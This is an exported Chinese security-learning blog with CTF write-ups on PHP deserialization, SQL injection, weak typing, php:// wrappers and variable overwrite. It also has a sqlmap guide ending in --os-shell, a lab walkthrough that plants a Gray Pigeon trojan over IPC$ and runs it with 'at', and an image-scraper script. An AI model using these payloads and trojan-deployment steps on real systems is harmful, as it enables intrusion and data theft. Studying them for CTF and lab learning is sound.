<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;  <span class="comment">//定义一个名为xctf的类</span></span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;<span class="comment">//定义一个公有的类属性$flag，值为111</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;  <span class="comment">//定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本</span></span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> xctf();   <span class="comment">//使用new运算符来实例化该类（xctf）的对象为test</span></span><br><span class="line"><span class="keyword">echo</span>(serialize($test));   <span class="comment">//输出被序列化的对象（test）</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>输出结果</p>
<pre><code>O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code></pre><p>我们要反序列化xctf类的同时还要绕过wakeup方法的执行（如果不绕过wakeup()方法，那么将会输出bad requests并退出脚本），wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。因此，需要修改序列化字符串中的属性个数：<br>当我们将上述的序列化的字符串中的对象属性个数由真实值1修改为2，即如下所示：</p>
<pre><code>O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code></pre><p>访问url?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap</title>
    <url>/2020/07/18/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h1><a id="more"></a>

<p>第一步:</p>
<pre><code>-u &quot;xx” --cookie= &quot;yyy&quot; //带上cookie对URL进行注入探测</code></pre><p>第二步:</p>
<pre><code>-u &quot;xxx” --cookie= &quot;yy&quot; - current--db //对数据库名进行获取</code></pre><p>第三步:</p>
<pre><code>-u &quot;xxx&quot; --cookie=&quot;yyy&quot; -D dvwa --tables //对数据库dvwa的表名进行枚举</code></pre><p>第四步:</p>
<pre><code>-u &quot;xx&quot; --cookie= &quot;yyy&quot; -D dvwa -T users --columns //对dvwa库里面的名为users表的列名进行枚举</code></pre><p>第五步:</p>
<pre><code>-u&quot;xxx&quot;--cookie=&quot;yyy&quot; -D dvwa -T users -C name,password - dump
//探测user表name和password字段</code></pre><p>如果此时得到的密码为密文, SQLmap会自动询问，是否爆破,选择”是”即可开始使用SQLMAP自带的字<br>典进行爆破。</p>
<p>第六步:</p>
<pre><code>-u&quot;xxx&quot;--cookie= &quot;yy&quot; --os - shell //获取shell,选择后台语言</code></pre><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>order by * </p>
<p>group by *</p>
<p>利用内置函数暴数据库信息</p>
<p>version() 查看数据库版本</p>
<p>database() 查看当前数据库名</p>
<p>user() 查看当前用户</p>
<p>查看表：</p>
<pre><code>Select  TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database()  </code></pre><p>可十六进制查看字段：</p>
<pre><code>select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=‘biaoming’;</code></pre>]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>nctf-2</title>
    <url>/2020/09/02/nctf-2/</url>
    <content><![CDATA[<h1 id="NCTF-2"><a href="#NCTF-2" class="headerlink" title="NCTF-2"></a>NCTF-2</h1><a id="more"></a>

<h2 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h2><p>题目源码给出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = trim($_POST[user]);</span><br><span class="line">  $pass = md5(trim($_POST[pass]));</span><br><span class="line">  $sql=<span class="string">"select user from ctf where (user='"</span>.$user.<span class="string">"') and (pw='"</span>.$pass.<span class="string">"')"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>.$sql;</span><br><span class="line">  $query = mysql_fetch_array(mysql_query($sql));</span><br><span class="line">  <span class="keyword">if</span>($query[user]==<span class="string">"admin"</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>($query[user] != <span class="string">"admin"</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;You are not admin!&lt;/p&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $query[user];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先post方法传递user和pass两个参数，然后带入sql语句中查询</p>
<p>注入点在这个位置</p>
<p><code>$sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot;</code></p>
<p><code>select user from ctf where (user=&#39;&#39;) and (pw=&#39;&#39;)</code></p>
<p>构造语句</p>
<p><code>select user from ctf where (user=&#39;admin&#39;) or 1=1 #)   and (pw=&#39;&#39;)</code> </p>
<p>在username中填入<code>admin&#39;) or 1=1 #</code>或者<code>admin&#39;) and 1=1 #</code>，提交即可获得flag</p>
<p><img src="/2020/09/02/nctf-2/sql1.png" alt></p>
<h2 id="passcheck"><a href="#passcheck" class="headerlink" title="passcheck"></a>passcheck</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$pass=@$_POST[<span class="string">'pass'</span>];</span><br><span class="line">$pass1=***********;<span class="comment">//被隐藏起来的密码</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($pass))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(@!strcmp($pass,$pass1))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag:nctf&#123;*&#125;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the pass is wrong!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"please input pass!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>strcmp() 函数比较两个字符串。</p>
<p><strong>注释：</strong>strcmp() 函数是二进制安全的，且对大小写敏感。</p>
<p><strong>提示：</strong>该函数与 <a href="https://www.w3school.com.cn/php/func_string_strncmp.asp" target="_blank" rel="noopener">strncmp()</a> 函数类似，不同的是，通过 strncmp() 您可以指定每个字符串用于比较的字符数。</p>
<p><img src="/2020/09/02/nctf-2/strcmp.png" alt></p>
<p>只有pass==pass1时才显示flag</p>
<p>感觉跟之前的变量覆盖相似</p>
<p><img src="/2020/09/02/nctf-2/passcheck.png" alt></p>
<p><strong>知识点：</strong><br>　　strcmp()函数 ：php5.3之前的strcmp的漏洞，当参数中的一个字符串是对象或者数组时，函数会返回0；<br>　　hackbar的使用，post方法<br>　　php弱类型，数组的使用。</p>
<p>参考： <a href="https://www.cnblogs.com/islsy/p/10667426.html" target="_blank" rel="noopener">https://www.cnblogs.com/islsy/p/10667426.html</a> </p>
<h2 id="起名字真难"><a href="#起名字真难" class="headerlink" title="起名字真难"></a>起名字真难</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       $one = ord(<span class="string">'1'</span>);</span><br><span class="line">       $nine = ord(<span class="string">'9'</span>);</span><br><span class="line">       <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">       &#123;   </span><br><span class="line">               $digit = ord($number&#123;$i&#125;);</span><br><span class="line">               <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) <span class="comment">//number中的数字不能在1-9</span></span><br><span class="line">               &#123;</span><br><span class="line">                       <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">               &#125;</span><br><span class="line">       &#125;</span><br><span class="line">          <span class="keyword">return</span> $number == <span class="string">'54975581388'</span>; <span class="comment">//number的值等于54975581388，与之前if语句矛盾</span></span><br><span class="line">&#125;</span><br><span class="line">$flag=<span class="string">'*******'</span>;</span><br><span class="line"><span class="keyword">if</span>(noother_says_correct($_GET[<span class="string">'key'</span>]))</span><br><span class="line">   <span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">'access denied'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>尝试将54975581388转成十六进制</p>
<p>0xccccccccc,  c的a值为12，满足if判断语句</p>
<p><code>?key=0xccccccccc</code></p>
<h2 id="sqlinject"><a href="#sqlinject" class="headerlink" title="sqlinject"></a>sqlinject</h2><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment">#GOAL: login as admin,then get the flag;</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($str)</span></span>&#123;  </span><br><span class="line">	<span class="keyword">if</span>(get_magic_quotes_gpc())&#123;  <span class="comment">//防止注入</span></span><br><span class="line">		$str=stripslashes($str); <span class="comment">//添加 \</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> htmlentities($str, ENT_QUOTES);<span class="comment">//过滤掉单引号，双引号，或者兼而有之</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);<span class="comment">//对获取的参数进行了处理</span></span><br><span class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line">$query=<span class="string">'SELECT * FROM users WHERE name=\''</span>.$username.<span class="string">'\' AND pass=\''</span>.$password.<span class="string">'\';'</span>;<span class="comment">//存在注入的语句</span></span><br><span class="line">$result=mysql_query($query);</span><br><span class="line"><span class="keyword">if</span>(!$result || mysql_num_rows($result) &lt; <span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'Invalid password!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<p> <strong>magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误</strong> </p>
<p> <code>SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;</code> </p>
<p> 反斜杠遇到单引号后，起到转义作用，实际sql语句如下</p>
<p><code>SELECT * FROM users WHERE name=&#39;.$username.&#39; AND pass=&#39;.$password.&#39;;</code> </p>
<p>这里注入与之前的注入不同，这里针对的是password</p>
<p><code>SELECT * FROM users WHERE name=&#39; \&#39; AND pass=&#39;  or 1=1 --+&#39;;</code></p>
<p><code>\&#39; AND pass=</code> 作为name 参数的值</p>
<p>所以构造?name=&amp;password=or 1=1 –+</p>
<p><img src="/2020/09/02/nctf-2/sql2.png" alt></p>
<h2 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123; <span class="comment">//post 方式接收两个参数</span></span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = $_POST[user];</span><br><span class="line">  $pass = md5($_POST[pass]);<span class="comment">//对pass  md5加密</span></span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select pw from ctf where user='$user'"</span>));<span class="comment">//获取pw字段的值</span></span><br><span class="line">  <span class="keyword">if</span> (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; <span class="comment">// 比较pass和pw</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>poyload:</p>
<p><code>user= &#39; union select md(1) &amp;pass=1</code></p>
<p><code>select pw from ctf where user=&#39;&#39; union select md(1)</code> </p>
<p>此查询语句获得我pw值为md(1),所以<code>if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw])))</code>语句成立，显示flag</p>
<p>(还没完全理解)</p>
<h2 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h2><p> 首页中给出很长的<code>jsfuck</code>，可以使用浏览器的<code>console</code>解码 ,给出一个页面</p>
<p>访问 <code>1bc29b36f623ba82aaf6724fd3b16718.php</code> </p>
<p><img src="/2020/09/02/nctf-2/ch2.png" alt></p>
<p>提示在header里</p>
<p><img src="/2020/09/02/nctf-2/ch1.png" alt></p>
<p>查看header</p>
<p><img src="/2020/09/02/nctf-2/ch.png" alt></p>
<p> <code>history of bash</code>使用过linux的同志会知道，如果使用的是<code>bash</code>，在家目录中会生成<code>.bash_history</code>文件用来保存历史命令。<br>访问<code>.bash_history</code>文件，可以得到这样的历史命令 </p>
<p>url: <a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history</a> </p>
<p>获得<code>zip -r flagbak.zip ./*</code></p>
<p>访问 <a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip</a></p>
<h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h2><p>查看源码获取被注释的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(@file_get_contents($file) == <span class="string">"meizijiu"</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $nctf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析可得</p>
<p><strong>通过get方式传递<code>flle</code>=文件名</strong><br><strong>并且这个文件的内容==‘meizijiu’</strong><br><strong>如果等于就打印flag</strong> </p>
<p>php伪协议<code>php://input</code>来构造原始数据的只读流 </p>
<p><img src="/2020/09/02/nctf-2/file.png" alt></p>
<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>参考 <a href="https://blog.csdn.net/niexinming/article/details/52637773?utm_source=blogxgwz1" target="_blank" rel="noopener">https://blog.csdn.net/niexinming/article/details/52637773?utm_source=blogxgwz1</a> </p>
<p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--<span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;  </span><br><span class="line">        $$key = $value;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>($name == <span class="string">"meizijiu233"</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;--&gt;</span><br></pre></td></tr></table></figure>

<p><code>?name=meizijiu233</code></p>
<p><img src="/2020/09/02/nctf-2/fugai.png" alt></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>弱类型</tag>
        <tag>php</tag>
        <tag>变量覆盖</tag>
      </tags>
  </entry>
  <entry>
    <title>木马</title>
    <url>/2020/07/18/%E6%9C%A8%E9%A9%AC/</url>
    <content><![CDATA[<h1 id="初识木马"><a href="#初识木马" class="headerlink" title="初识木马"></a>初识木马</h1><a id="more"></a>
<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p><strong>使用灰鸽子软件以及端口爆破软件控制目的主机</strong></p>
<p>准备一台xp，一台2003<br>其中xp地址为10.1.1.3/24 2003为10.1.1.1/24<br>使两个主机能够通信<br>xp作为攻击方，2003为受害者</p>
<h3 id="1-制作木马"><a href="#1-制作木马" class="headerlink" title="1.制作木马"></a>1.制作木马</h3><p>使用灰鸽子制作木马，将木马生成在在桌面（记住路径之后要使用）<br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/3.png" alt><br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/4.png" alt></p>
<h3 id="2-扫描主机，并对账号密码进行爆破"><a href="#2-扫描主机，并对账号密码进行爆破" class="headerlink" title="2.扫描主机，并对账号密码进行爆破"></a>2.扫描主机，并对账号密码进行爆破</h3><p>ip起始地址为10.1.1.1-10.1.1.255<br>密码配置文件<br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/2.png" alt><br>其实只要扫描10.1.1.1即可（因为是实验）</p>
<p>获取账号密码<br>username：administrator<br>password: “”</p>
<h3 id="3-与目标主机建立IPC"><a href="#3-与目标主机建立IPC" class="headerlink" title="3.与目标主机建立IPC$"></a>3.与目标主机建立IPC$</h3><p><code>net use \\10.1.1.1\ipc$ &quot;&quot; \user:administrator</code></p>
<h3 id="4-植入木马到目标主机"><a href="#4-植入木马到目标主机" class="headerlink" title="4.植入木马到目标主机"></a>4.植入木马到目标主机</h3><p><code>copy C:\Documents and Settings\shimisi\桌面\qq.exe  \\10.1.1.1\ipc$</code></p>
<h3 id="5-设置目标主机运行木马"><a href="#5-设置目标主机运行木马" class="headerlink" title="5.设置目标主机运行木马"></a>5.设置目标主机运行木马</h3><p><code>net time \\10.1.1.1</code>根据目标主机时间设置事物的开始时间<br><code>at \\10.1.1.1 17:17 c:\qq.exe</code>在上面的时间之后三分钟左右设置一个事物<br>即在17：17时运行木马文件</p>
<h3 id="6-成功控制目标主机"><a href="#6-成功控制目标主机" class="headerlink" title="6.成功控制目标主机"></a>6.成功控制目标主机</h3><p>观察目标主机已自动上线，已可以进行监控或传输数据等操作</p>
<p>获取屏幕内容<br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/5.png" alt></p>
<p>控制命令行<br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/6.png" alt></p>
]]></content>
      <categories>
        <category>木马</category>
      </categories>
  </entry>
  <entry>
    <title>爬图</title>
    <url>/2020/07/18/%E7%88%AC%E5%9B%BE/</url>
    <content><![CDATA[<h1 id="用爬虫爬取小姐姐的图片"><a href="#用爬虫爬取小姐姐的图片" class="headerlink" title="用爬虫爬取小姐姐的图片"></a>用爬虫爬取小姐姐的图片</h1><a id="more"></a>
<p><strong>用的库</strong></p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">re <span class="comment">#正则表达式</span></span><br><span class="line">requests <span class="comment">#url请求</span></span><br><span class="line"><span class="built_in">time</span>   <span class="comment">#时间</span></span><br><span class="line">os     <span class="comment">#用于创建文件夹，保存图片</span></span><br></pre></td></tr></table></figure>
<p>##准备工作<br>1.首先访问该链接<br><code>https://www.vmgirls.com/</code><br>2.随便点击一个进入查看详情<br><code>https://www.vmgirls.com/13344.html</code><br>3.F12审查元素网查看页详情，主要查看图片链接的标签位置，写出正则表达式<br><img src="/2020/07/18/%E7%88%AC%E5%9B%BE/picturelink.png" alt="1"><br>该正则表达式为<code>findlinks = &#39;&lt;a href=&quot;(.*?)&quot; alt=&quot;.*?&quot; title=&quot;.*?&quot;&gt;&#39;</code></p>
<h2 id="完整程序"><a href="#完整程序" class="headerlink" title="完整程序"></a>完整程序</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding = utf - 8 -*-</span></span><br><span class="line"><span class="comment">#@Time : 2020/7/16 13:36</span></span><br><span class="line"><span class="comment">#@Author : sunzy</span></span><br><span class="line"><span class="comment">#@File : tupian.py</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">dir = <span class="string">"plmm"</span>        <span class="comment">#文件夹名字</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(dir):   <span class="comment">#首先判断是否存在当前文件夹如果没有则创建一个</span></span><br><span class="line">    os.mkdir(dir)</span><br><span class="line"><span class="comment"># 模仿浏览器的首部信息，绕过一些网站的反爬取措施</span></span><br><span class="line">head = &#123;</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61"</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://www.vmgirls.com/13344.html"</span></span><br><span class="line">response = requests.get(url, headers = head)   <span class="comment"># 访问目标网页，获取网页内容</span></span><br><span class="line">html = response.text</span><br><span class="line"></span><br><span class="line">findlinks = <span class="string">'&lt;a href="(.*?)" alt=".*?" title=".*?"&gt;'</span></span><br><span class="line">urls = re.findall(findlinks, html)   <span class="comment">#爬取到的图片链接保存在urls中， 是一个列表</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">    time.sleep(<span class="number">1</span>)    <span class="comment">#防止访问速度过快使服务器崩溃</span></span><br><span class="line">    file_name = url.split(<span class="string">'/'</span>)[<span class="number">-1</span>]    <span class="comment">#保存图片的名字</span></span><br><span class="line"></span><br><span class="line">    res = requests.get(url, headers = head)   <span class="comment">#依此访问图片链接</span></span><br><span class="line">    <span class="keyword">with</span> open(dir+<span class="string">'/'</span>+file_name, <span class="string">"wb"</span>) <span class="keyword">as</span> f:   <span class="comment">#以二进制形式保存图片</span></span><br><span class="line">        f.write(res.content)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>综合2</title>
    <url>/2020/09/03/%E7%BB%BC%E5%90%882/</url>
    <content><![CDATA[<h1 id="NCTF-综合2"><a href="#NCTF-综合2" class="headerlink" title="NCTF-综合2"></a>NCTF-综合2</h1><a id="more"></a>

<p>进入页面，没什么特别的地方，随便点点</p>
<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/1.png" alt></p>
<p>留言可以正常提交，本以为有xss,但是已经提示不是xss</p>
<p>看到最下面有个网站说明   <a href="http://cms.nuptzj.cn/about.php?file=sm.txt" target="_blank" rel="noopener">本CMS说明</a>  ，有用的内容如下</p>
<blockquote>
<p>config.php：存放数据库信息，移植此CMS时要修改 </p>
<p>index.php：主页文件 </p>
<p>passencode.php：Funny公司自写密码加密算法库 </p>
<p>say.php：用于接收和处理用户留言请求 </p>
<p>sm.txt：本CMS的说明文档 sae的information_schema表好像没法检索</p>
<p>admin表结构 create table admin ( id integer, username text, userpass text, )  </p>
</blockquote>
<p> <code>http://cms.nuptzj.cn/about.php?file=sm.txt</code>可以使用php伪协议任意读取文件内容。 包括自己</p>
<p>尝试读取index.php的源码，发现好像并没有什么用</p>
<p>读取<code>about.php</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">if($file&#x3D;&#x3D;&quot;&quot; || strstr($file,&#39;config.php&#39;))&#123;   &#x2F;&#x2F; 有config.php</span><br><span class="line">	echo &quot;file参数不能为空！&quot;;</span><br><span class="line">	exit();</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	$cut&#x3D;strchr($file,&quot;loginxlcteam&quot;);   &#x2F;&#x2F;包含了 loginxlcteam页面</span><br><span class="line">	if($cut&#x3D;&#x3D;false)&#123;</span><br><span class="line">	$data&#x3D;file_get_contents($file);</span><br><span class="line">	$date&#x3D;htmlspecialchars($data);</span><br><span class="line">	echo $date;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		echo &quot;&lt;script&gt;alert(&#39;敏感目录，禁止查看！但是。。。&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>读取config.php，无有用信息</p>
<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/2.png" alt></p>
<p>查看<code>loginxlcteam</code>,是个登录页面</p>
<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/3.png" alt></p>
<p>到此还是无从下手，参考大佬的博客 <a href="https://blog.csdn.net/zz_Caleb/article/details/88652838?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/zz_Caleb/article/details/88652838?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase</a> </p>
<p>在搜索页面中也存在有用信息</p>
<p> <code>http://cms.nuptzj.cn/about.php?file=so.php</code>获取源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">//so.php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]!=<span class="string">"Xlcteam Browser"</span>)&#123; </span><br><span class="line">    <span class="comment">//必须修改http头，吧user-agent改成Xlcteam Browser</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~'</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_POST[<span class="string">'soid'</span>];				<span class="comment">//post 一个soid</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'antiinject.php'</span>;   <span class="comment">//防注入的文件</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'antixss.php'</span>;      <span class="comment">//防xss的文件		</span></span><br><span class="line">$id=antiinject($id);		<span class="comment">//对id过滤</span></span><br><span class="line">$con = mysql_connect($db_address,$db_user,$db_pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"不能连接到数据库！！"</span>.mysql_error());</span><br><span class="line">mysql_select_db($db_name,$con);</span><br><span class="line">$id=mysql_real_escape_string($id);</span><br><span class="line">$result=mysql_query(<span class="string">"SELECT * FROM `message` WHERE display=1 AND id=$id"</span>);  <span class="comment">//sql查询，可能存在注入点</span></span><br><span class="line">$rs=mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">echo</span> htmlspecialchars($rs[<span class="string">'nice'</span>]).<span class="string">':&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'</span>.antixss($rs[<span class="string">'say'</span>]).<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">mysql_free_result($result);</span><br><span class="line">mysql_free_result($file);</span><br><span class="line">mysql_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





